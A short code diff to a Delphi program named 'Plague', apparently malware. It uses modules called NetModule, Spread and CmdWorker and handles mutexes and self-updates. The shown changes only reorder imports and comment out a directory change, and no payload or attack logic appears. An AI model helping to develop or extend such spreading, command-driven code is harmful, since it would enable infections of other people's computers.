@@ -4,8 +4,8 @@ program Plague;
 
 uses
   Debug,
-  NetModule, Tools,
-  Classes, Windows, SysUtils, CmdWorker, Spread;
+  NetModule, Tools, Spread,
+  Classes, Windows, SysUtils, CmdWorker;
 
 var
   J, I: LongInt;
@@ -24,7 +24,7 @@ Begin
     if FileExists(ParamStr(0)+'.old') then DeleteFile(ParamStr(0)+'.old');
   if Settings.ReadInteger('General', 'FirstRun', 1) = 1 then DoFirstRun;
   MutexMagic;
-  ChDir(Base);
+  //ChDir(Base);
 
   Net:=TNet.Create(Nil);
   Repeat
